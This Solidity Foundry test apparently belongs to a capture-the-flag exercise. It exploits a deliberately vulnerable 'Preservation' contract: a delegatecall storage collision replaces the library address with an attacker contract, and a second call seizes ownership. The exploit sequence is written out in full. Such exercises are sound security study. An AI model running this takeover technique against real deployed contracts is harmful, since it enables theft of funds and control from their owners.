// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {PreservationHacker} from "../src/PreservationHacker.sol";
import {Preservation, LibraryContract} from "../src/Preservation.sol";

contract PreservationHackerTest is Test {

  function test_hack() public {
    address deployer = makeAddr("deployer");
    vm.startPrank(deployer, deployer);
    LibraryContract library1 = new LibraryContract();
    LibraryContract library2 = new LibraryContract();
    Preservation preservation = new Preservation(address(library1), address(library2));
    vm.stopPrank();

    address hacker = makeAddr("hacker");
    vm.startPrank(hacker, hacker);
    PreservationHacker fakeLibrary = new PreservationHacker();
    uint256 fakeLibAddrAsUint = uint256(uint160(address(fakeLibrary)));
    preservation.setFirstTime(fakeLibAddrAsUint);
    preservation.setFirstTime(0);

    assertEq(preservation.owner(), hacker);
  }
}